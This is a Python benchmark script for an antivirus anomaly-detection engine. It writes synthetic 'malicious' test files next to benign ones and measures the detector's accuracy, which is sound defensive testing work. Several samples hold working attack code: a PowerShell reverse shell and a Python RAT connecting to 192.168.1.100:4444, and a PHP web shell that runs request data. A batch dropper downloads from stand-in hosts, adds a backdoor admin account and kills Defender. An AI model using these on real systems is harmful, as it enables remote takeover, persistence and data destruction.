"""
HThuong Antivirus AI — Anomaly Engine Benchmark
Đánh giá Isolation Forest trên file thật (hệ thống Windows) + synthetic malware patterns.

Approach:
  - Benign: Quét các file hệ thống thật (EXE, DLL, scripts, text, media)
  - Malicious: Tạo synthetic file mô phỏng đặc trưng malware (dropper, payload, backdoor)
  - EICAR: Standard test file
  
Output: Precision, Recall, F1, Confusion Matrix, per-file results
"""

import os
import sys
import json
import time
import tempfile
import struct
import numpy as np

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "src"))

from engine.anomaly_engine import AnomalyEngine

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "models", "anomaly")

# ============================================================
# Test file collections
# ============================================================

# Windows system files — guaranteed BENIGN
BENIGN_SYSTEM_FILES = [
    # Executables
    r"C:\Windows\System32\notepad.exe",
    r"C:\Windows\System32\calc.exe",
    r"C:\Windows\System32\mspaint.exe",
    r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\taskmgr.exe",
    r"C:\Windows\System32\regedit.exe",
    r"C:\Windows\System32\explorer.exe",
    r"C:\Windows\System32\mmc.exe",
    r"C:\Windows\System32\dxdiag.exe",
    r"C:\Windows\System32\msinfo32.exe",
    r"C:\Windows\System32\charmap.exe",
    r"C:\Windows\System32\control.exe",
    r"C:\Windows\System32\sfc.exe",
    r"C:\Windows\System32\chkdsk.exe",
    r"C:\Windows\System32\diskpart.exe",
    r"C:\Windows\System32\where.exe",
    r"C:\Windows\System32\whoami.exe",
    r"C:\Windows\System32\hostname.exe",
    r"C:\Windows\System32\ipconfig.exe",
    r"C:\Windows\System32\ping.exe",
    r"C:\Windows\System32\tracert.exe",
    r"C:\Windows\System32\nslookup.exe",
    r"C:\Windows\System32\netstat.exe",
    r"C:\Windows\System32\findstr.exe",
    r"C:\Windows\System32\xcopy.exe",
    # DLLs
    r"C:\Windows\System32\kernel32.dll",
    r"C:\Windows\System32\user32.dll",
    r"C:\Windows\System32\ntdll.dll",
    r"C:\Windows\System32\advapi32.dll",
    r"C:\Windows\System32\shell32.dll",
    r"C:\Windows\System32\gdi32.dll",
    r"C:\Windows\System32\ole32.dll",
    r"C:\Windows\System32\ws2_32.dll",
    r"C:\Windows\System32\msvcrt.dll",
    r"C:\Windows\System32\secur32.dll",
    # Text/Config files
    r"C:\Windows\System32\drivers\etc\hosts",
    r"C:\Windows\System32\drivers\etc\services",
    r"C:\Windows\win.ini",
]


def create_synthetic_malware_files(temp_dir: str) -> list:
    """
    Tạo synthetic files mô phỏng đặc trưng MALWARE.
    Đây KHÔNG phải malware thật, chỉ là file có đặc trưng tương tự
    (entropy cao, suspicious patterns nhiều, file nhỏ...).
    
    Returns: list of (file_path, label, description)
    """
    files = []

    # --- 1. Dropper-like: nhỏ + nhiều suspicious strings ---
    dropper = os.path.join(temp_dir, "synthetic_dropper.bin")
    with open(dropper, "wb") as f:
        # PE header
        f.write(b"MZ" + os.urandom(60))
        # Suspicious strings (simulated)
        for pattern in [
            b"cmd.exe /c ", b"powershell -enc ", b"reg add HKLM\\",
            b"taskkill /f /im ", b"CreateRemoteThread", b"VirtualAllocEx",
            b"WriteProcessMemory", b"URLDownloadToFile", b"WinExec",
            b"ShellExecute", b"keylog", b"screenshot", b"password",
            b"bitcoin", b"ransom", b"encrypt", b"decrypt",
            b"mimikatz", b"metasploit", b"payload", b"reverse_tcp",
        ]:
            f.write(pattern + b"\x00" * 4)
        # Network patterns
        for net in [b"http://evil.com/payload", b"https://c2.server/beacon",
                     b"socket(", b"connect(", b"send(", b"recv("]:
            f.write(net + b"\x00" * 4)
        # Fill rest with high-entropy random data
        f.write(os.urandom(2000))
    files.append((dropper, "malicious", "Synthetic dropper (PE + many sus patterns + small)"))

    # --- 2. Reverse shell script ---
    revshell = os.path.join(temp_dir, "synthetic_revshell.ps1")
    with open(revshell, "w") as f:
        f.write("""
# Synthetic reverse shell payload for testing
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
}
cmd.exe /c whoami
powershell -enc base64encodedcommand
CreateRemoteThread
VirtualAllocEx
WriteProcessMemory
URLDownloadToFile http://malware.server/payload.exe
ShellExecute
keylog password bitcoin ransom encrypt decrypt
""")
    files.append((revshell, "malicious", "Synthetic PowerShell reverse shell"))

    # --- 3. Encoded payload (high entropy binary) ---
    payload = os.path.join(temp_dir, "synthetic_payload.dat")
    with open(payload, "wb") as f:
        f.write(b"MZ" + os.urandom(30))
        # High entropy encoded shellcode simulation
        f.write(os.urandom(3000))
        # Inject suspicious markers throughout
        f.write(b"cmd.exe" * 5 + b"powershell" * 5)
        f.write(b"CreateRemoteThread" + b"VirtualAllocEx" + b"WriteProcessMemory")
        f.write(b"password" * 3 + b"keylog" * 3 + b"encrypt" * 3)
        f.write(b"http://c2.evil.com" * 3 + b"socket" * 3 + b"connect" * 3)
        f.write(os.urandom(2000))
    files.append((payload, "malicious", "Synthetic encoded payload (high entropy)"))

    # --- 4. Keylogger-like file ---
    keylogger = os.path.join(temp_dir, "synthetic_keylogger.exe")
    with open(keylogger, "wb") as f:
        f.write(b"MZ" + struct.pack("<H", 0x0090) + os.urandom(58))
        content = b"""
        GetAsyncKeyState SetWindowsHookEx
        keylog screenshot password
        CreateRemoteThread VirtualAllocEx
        WriteProcessMemory URLDownloadToFile
        http://keylog-server.com/upload
        ftp://data-exfil.com/keys
        socket connect send recv
        cmd.exe /c reg add powershell -enc
        mimikatz sekurlsa::logonpasswords
        bitcoin wallet ransom encrypt decrypt
        """
        f.write(content * 5)
        f.write(os.urandom(1500))
    files.append((keylogger, "malicious", "Synthetic keylogger (PE + keylog patterns)"))

    # --- 5. Ransomware-like file ---
    ransom = os.path.join(temp_dir, "synthetic_ransom.bin")
    with open(ransom, "wb") as f:
        f.write(b"MZ" + os.urandom(60))
        # Ransomware patterns
        for _ in range(10):
            f.write(b"encrypt" + b"decrypt" + b"ransom" + b"bitcoin")
            f.write(b"Your files have been encrypted! Pay 1 BTC to recover.")
            f.write(b"AES-256-CBC" + b"RSA-2048" + b"OpenSSL")
        f.write(b"cmd.exe /c vssadmin delete shadows /all /quiet")
        f.write(b"powershell -enc " + os.urandom(200))
        f.write(b"WriteProcessMemory" + b"CreateRemoteThread")
        f.write(b"http://pay.ransom.onion/decrypt" * 3)
        f.write(os.urandom(2000))
    files.append((ransom, "malicious", "Synthetic ransomware (encrypt+ransom patterns)"))

    # --- 6. Web shell ---
    webshell = os.path.join(temp_dir, "synthetic_webshell.php")
    with open(webshell, "w") as f:
        f.write("""<?php
// Synthetic web shell for testing anomaly detection
@eval($_POST['cmd']);
system("cmd.exe /c " . $_GET['c']);
passthru("powershell -enc " . base64_encode($_POST['ps']));
$sock = fsockopen("192.168.1.100", 4444);
exec("/bin/sh -i");
$output = shell_exec("whoami");
URLDownloadToFile("http://malware.server/payload.exe", "C:\\temp\\payload.exe");
CreateRemoteThread VirtualAllocEx WriteProcessMemory
keylog password bitcoin ransom encrypt decrypt mimikatz screenshot
?>
""")
    files.append((webshell, "malicious", "Synthetic PHP web shell"))

    # --- 7. Python RAT ---
    rat = os.path.join(temp_dir, "synthetic_rat.py")
    with open(rat, "w") as f:
        f.write("""#!/usr/bin/env python3
# Synthetic RAT (Remote Access Trojan) for testing
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))
while True:
    data = s.recv(1024)
    output = subprocess.check_output(data, shell=True)
    s.send(output)
# cmd.exe /c net user hacker P@ssw0rd /add
# powershell -enc encoded_command
# keylog screenshot password bitcoin ransom encrypt decrypt
# CreateRemoteThread VirtualAllocEx WriteProcessMemory URLDownloadToFile
# mimikatz payload reverse_tcp bind_shell metasploit
""")
    files.append((rat, "malicious", "Synthetic Python RAT"))

    # --- 8. Batch dropper ---
    batch = os.path.join(temp_dir, "synthetic_batch_dropper.bat")
    with open(batch, "w") as f:
        f.write("""@echo off
REM Synthetic batch dropper for testing
cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /t REG_SZ /d "C:\\temp\\payload.exe"
powershell -enc aGVsbG8gd29ybGQ=
taskkill /f /im defender.exe
bitsadmin /transfer malware /download /priority HIGH http://evil.com/payload.exe C:\\temp\\payload.exe
URLDownloadToFile http://c2.server/beacon.exe C:\\temp\\beacon.exe
certutil -urlcache -split -f http://malware.site/shell.exe C:\\temp\\shell.exe
net user backdoor P@ssw0rd123 /add
net localgroup Administrators backdoor /add
keylog password bitcoin ransom encrypt decrypt
""")
    files.append((batch, "malicious", "Synthetic batch dropper"))

    # --- Benign synthetic files --- 
    
    # 9. Normal text file
    normal_txt = os.path.join(temp_dir, "normal_readme.txt")
    with open(normal_txt, "w") as f:
        f.write("This is a normal README file.\n" * 50)
        f.write("Project documentation for testing purposes.\n" * 30)
    files.append((normal_txt, "benign", "Normal text file"))

    # 10. Normal Python script
    normal_py = os.path.join(temp_dir, "normal_script.py")
    with open(normal_py, "w") as f:
        f.write("""#!/usr/bin/env python3
\"\"\"A normal Python script for data processing\"\"\"
import os
import json
import csv

def read_config(path):
    with open(path, 'r') as f:
        return json.load(f)

def process_data(input_file, output_file):
    with open(input_file, 'r') as fin, open(output_file, 'w') as fout:
        reader = csv.reader(fin)
        writer = csv.writer(fout)
        for row in reader:
            writer.writerow([cell.strip() for cell in row])

if __name__ == '__main__':
    config = read_config('config.json')
    process_data(config['input'], config['output'])
    print("Processing complete!")
""")
    files.append((normal_py, "benign", "Normal Python script"))

    # 11. Normal JSON config
    normal_json = os.path.join(temp_dir, "config.json")
    with open(normal_json, "w") as f:
        json.dump({
            "app_name": "MyApp",
            "version": "1.0.0",
            "database": {"host": "localhost", "port": 5432},
            "features": ["auth", "logging", "cache"],
        }, f, indent=2)
    files.append((normal_json, "benign", "Normal JSON config"))

    # 12. Normal HTML page
    normal_html = os.path.join(temp_dir, "index.html")
    with open(normal_html, "w") as f:
        f.write("""<!DOCTYPE html>
<html><head><title>My Website</title></head>
<body>
<h1>Welcome to My Website</h1>
<p>This is a normal HTML page with standard content.</p>
<ul><li>Home</li><li>About</li><li>Contact</li></ul>
</body></html>
""")
    files.append((normal_html, "benign", "Normal HTML page"))

    # 13. Normal CSS
    normal_css = os.path.join(temp_dir, "style.css")
    with open(normal_css, "w") as f:
        f.write("""body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
h1 { color: #333; }
.container { max-width: 1200px; margin: 0 auto; }
.btn { background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 4px; }
""" * 20)
    files.append((normal_css, "benign", "Normal CSS stylesheet"))

    # 14. Normal CSV data
    normal_csv = os.path.join(temp_dir, "data.csv")
    with open(normal_csv, "w") as f:
        f.write("id,name,email,age,score\n")
        for i in range(100):
            f.write(f"{i},User{i},user{i}@example.com,{20+i%40},{50+i%50}\n")
    files.append((normal_csv, "benign", "Normal CSV data file"))

    # 15. Normal image-like binary (random but structured)
    normal_bin = os.path.join(temp_dir, "image_data.raw")
    with open(normal_bin, "wb") as f:
        # Simulated image header + pixel data (high entropy but benign)
        f.write(b"\x89PNG\r\n\x1a\n")  # PNG header
        f.write(os.urandom(50000))  # Random pixel data
    files.append((normal_bin, "benign", "Normal binary data (PNG-like)"))

    return files


# ============================================================
# EICAR Test File
# ============================================================
def create_eicar_file(temp_dir: str) -> str:
    """Tạo EICAR standard test file"""
    eicar_path = os.path.join(temp_dir, "eicar_test.com")
    eicar_content = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    with open(eicar_path, "wb") as f:
        f.write(eicar_content)
    return eicar_path


# ============================================================
# Benchmark Runner
# ============================================================
def run_benchmark():
    print("=" * 70)
    print("  HThuong Antivirus AI — Anomaly Engine Benchmark")
    print("  Đánh giá Isolation Forest trên file thật + synthetic malware")
    print("=" * 70)

    engine = AnomalyEngine()
    if not engine.is_loaded:
        print("ERROR: Anomaly engine not loaded.")
        return

    print(f"\n  Model: IsolationForest")
    print(f"  Trained samples: {engine.metadata.get('trained_samples', 'N/A')}")
    print(f"  MIN_CONFIDENCE_THRESHOLD: {engine.MIN_CONFIDENCE_THRESHOLD}")

    # Collect test files
    test_files = []  # (path, expected_label, description)

    # 1. Real system files (benign)
    print("\n[1] Collecting real system files (benign)...")
    benign_count = 0
    for fpath in BENIGN_SYSTEM_FILES:
        if os.path.exists(fpath):
            test_files.append((fpath, "benign", os.path.basename(fpath)))
            benign_count += 1
    print(f"  Found {benign_count} system files")

    # 2. Source code files in this project (benign)
    print("[2] Collecting project source files (benign)...")
    project_root = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
    for ext in ["*.py", "*.js", "*.jsx", "*.json", "*.md", "*.html", "*.css"]:
        import glob
        for fpath in glob.glob(os.path.join(project_root, "**", ext), recursive=True):
            if "node_modules" not in fpath and "legacy" not in fpath and os.path.getsize(fpath) > 100:
                test_files.append((fpath, "benign", os.path.relpath(fpath, project_root)))
                benign_count += 1
                if benign_count > 80:
                    break
        if benign_count > 80:
            break
    print(f"  Total benign: {benign_count}")

    # 3. Synthetic malware + benign files
    print("[3] Creating synthetic test files...")
    temp_dir = tempfile.mkdtemp(prefix="anomaly_bench_")
    synthetic_files = create_synthetic_malware_files(temp_dir)
    for fpath, label, desc in synthetic_files:
        test_files.append((fpath, label, desc))

    # 4. EICAR test file
    print("[4] Creating EICAR test file...")
    eicar_path = create_eicar_file(temp_dir)
    test_files.append((eicar_path, "malicious", "EICAR standard test file"))

    # Summary
    total_benign = sum(1 for _, l, _ in test_files if l == "benign")
    total_malicious = sum(1 for _, l, _ in test_files if l == "malicious")
    print(f"\n  Total test files: {len(test_files)}")
    print(f"  Benign: {total_benign}, Malicious: {total_malicious}")

    # ============================================================
    # Run predictions
    # ============================================================
    print(f"\n{'='*70}")
    print("  Running anomaly detection on all files...")
    print(f"{'='*70}")

    results = []
    start_time = time.time()

    for fpath, expected, desc in test_files:
        result = engine.check(fpath)
        predicted = "malicious" if result.get("detected", False) else "benign"
        
        results.append({
            "path": fpath,
            "description": desc,
            "expected": expected,
            "predicted": predicted,
            "correct": expected == predicted,
            "anomaly_score": result.get("anomaly_score", None),
            "confidence": result.get("confidence", None),
            "threat_level": result.get("threat_level", "unknown"),
            "features": result.get("features", {}),
        })

    elapsed = time.time() - start_time

    # ============================================================
    # Compute metrics
    # ============================================================
    y_true = [r["expected"] for r in results]
    y_pred = [r["predicted"] for r in results]

    tp = sum(1 for t, p in zip(y_true, y_pred) if t == "malicious" and p == "malicious")
    fp = sum(1 for t, p in zip(y_true, y_pred) if t == "benign" and p == "malicious")
    tn = sum(1 for t, p in zip(y_true, y_pred) if t == "benign" and p == "benign")
    fn = sum(1 for t, p in zip(y_true, y_pred) if t == "malicious" and p == "benign")

    accuracy = (tp + tn) / len(results) if results else 0
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0
    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0

    print(f"\n{'='*70}")
    print("  RESULTS")
    print(f"{'='*70}")
    print(f"\n  Total files scanned: {len(results)}")
    print(f"  Time: {elapsed:.2f}s ({len(results)/elapsed:.1f} files/sec)")
    print(f"\n  Confusion Matrix:")
    print(f"                       Predicted")
    print(f"                   Benign  Malicious")
    print(f"  Actual Benign   {tn:>6}  {fp:>6}")
    print(f"  Actual Malicious{fn:>6}  {tp:>6}")
    print(f"\n  Accuracy:    {accuracy:.4f} ({accuracy:.1%})")
    print(f"  Precision:   {precision:.4f} ({precision:.1%})")
    print(f"  Recall:      {recall:.4f} ({recall:.1%})")
    print(f"  F1-Score:    {f1:.4f} ({f1:.1%})")
    print(f"  FPR:         {fpr:.4f} ({fpr:.1%})")

    # ============================================================
    # Detail: Misclassifications
    # ============================================================
    wrong = [r for r in results if not r["correct"]]
    if wrong:
        print(f"\n  Misclassifications ({len(wrong)}):")
        for r in wrong:
            indicator = "FP" if r["expected"] == "benign" else "FN"
            print(f"    [{indicator}] {r['description']}")
            print(f"        Expected: {r['expected']}, Got: {r['predicted']}")
            print(f"        Score: {r['anomaly_score']}, Confidence: {r['confidence']}")
            feats = r.get("features", {})
            if feats:
                print(f"        Entropy: {feats.get('entropy', '?')}, "
                      f"SusPatterns: {feats.get('suspicious_patterns', '?')}, "
                      f"NetPatterns: {feats.get('network_patterns', '?')}, "
                      f"IsPE: {feats.get('is_pe', '?')}")
    else:
        print(f"\n  No misclassifications! All {len(results)} files correctly classified.")

    # ============================================================
    # Detail: Malicious file results
    # ============================================================
    print(f"\n  Malicious file details:")
    for r in results:
        if r["expected"] == "malicious":
            status = "✓ DETECTED" if r["predicted"] == "malicious" else "✗ MISSED"
            print(f"    [{status}] {r['description']}")
            print(f"        Score: {r['anomaly_score']}, Confidence: {r['confidence']}, "
                  f"Threat: {r['threat_level']}")

    # ============================================================
    # Score distribution summary
    # ============================================================
    benign_scores = [r["anomaly_score"] for r in results if r["expected"] == "benign" and r["anomaly_score"] is not None]
    malicious_scores = [r["anomaly_score"] for r in results if r["expected"] == "malicious" and r["anomaly_score"] is not None]

    if benign_scores:
        print(f"\n  Score Distribution:")
        print(f"    Benign files:    mean={np.mean(benign_scores):.4f}, "
              f"std={np.std(benign_scores):.4f}, "
              f"min={np.min(benign_scores):.4f}, max={np.max(benign_scores):.4f}")
    if malicious_scores:
        print(f"    Malicious files: mean={np.mean(malicious_scores):.4f}, "
              f"std={np.std(malicious_scores):.4f}, "
              f"min={np.min(malicious_scores):.4f}, max={np.max(malicious_scores):.4f}")

    # ============================================================
    # Save results
    # ============================================================
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    output_path = os.path.join(OUTPUT_DIR, "benchmark_results.json")

    benchmark_data = {
        "summary": {
            "total_files": len(results),
            "benign_files": total_benign,
            "malicious_files": total_malicious,
            "accuracy": round(accuracy, 4),
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1_score": round(f1, 4),
            "false_positive_rate": round(fpr, 4),
            "true_positives": tp,
            "false_positives": fp,
            "true_negatives": tn,
            "false_negatives": fn,
            "scan_time_seconds": round(elapsed, 2),
            "files_per_second": round(len(results) / elapsed, 1),
        },
        "model_info": engine.metadata,
        "misclassifications": [
            {
                "path": r["description"],
                "expected": r["expected"],
                "predicted": r["predicted"],
                "anomaly_score": r["anomaly_score"],
                "confidence": r["confidence"],
                "features": r["features"],
            }
            for r in wrong
        ],
        "score_distribution": {
            "benign_mean": round(float(np.mean(benign_scores)), 4) if benign_scores else None,
            "benign_std": round(float(np.std(benign_scores)), 4) if benign_scores else None,
            "malicious_mean": round(float(np.mean(malicious_scores)), 4) if malicious_scores else None,
            "malicious_std": round(float(np.std(malicious_scores)), 4) if malicious_scores else None,
        },
        "benchmarked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
    }

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(benchmark_data, f, indent=2, ensure_ascii=False)
    print(f"\n  Results saved to: {output_path}")

    # Cleanup temp files
    import shutil
    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"  Temp files cleaned up.")
    print("=" * 70)

    return benchmark_data


if __name__ == "__main__":
    run_benchmark()
